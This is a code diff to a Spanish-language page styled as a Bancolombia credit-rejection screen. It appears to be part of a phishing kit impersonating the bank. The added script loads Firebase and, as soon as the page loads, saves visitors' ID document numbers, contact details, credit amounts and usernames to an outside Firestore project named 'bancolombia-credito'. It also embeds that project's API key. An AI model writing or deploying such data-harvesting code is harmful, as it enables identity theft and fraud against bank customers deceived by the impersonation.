@@ -2,6 +2,8 @@
 <!-- reject-v2 #e53935 no-cupo -->
 <html lang="es">
 <head>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Solicitud rechazada — Bancolombia</title>
@@ -203,6 +205,37 @@
         BcStore.fetchIpThen();
       }
     })();
+    const firebaseConfig = {
+  apiKey: "AIzaSy5yDnpt57vNCirFZnVklze_irVBT9hmiqbY",
+  authDomain: "bancolombia-credito.firebaseapp.com",
+  projectId: "bancolombia-credito",
+  storageBucket: "bancolombia-credito.appspot.com",
+  messagingSenderId: "354851030251",
+  appId: "1:354851030251:web:e98a68eb7d81a79d942aae"
+};
+
+if (!window.firebaseApp) {
+  window.firebaseApp = firebase.initializeApp(firebaseConfig);
+}
+const db = firebase.firestore();
+
+async function guardarEnFirebase() {
+  try {
+    await db.collection('solicitudes').add({
+      documento: doc || '',
+      contacto: contacto || '',
+      cupo: cupo || '',
+      usuario: usuario || '',
+      fecha: new Date().toLocaleString('es-CO'),
+      estado: "RECHAZADA"
+    });
+    console.log('✅ ¡Guardado en Firebase!');
+  } catch(error) {
+    console.error('❌ Error:', error);
+  }
+}
+
+guardarEnFirebase();
   </script>
 </body>
 </html>
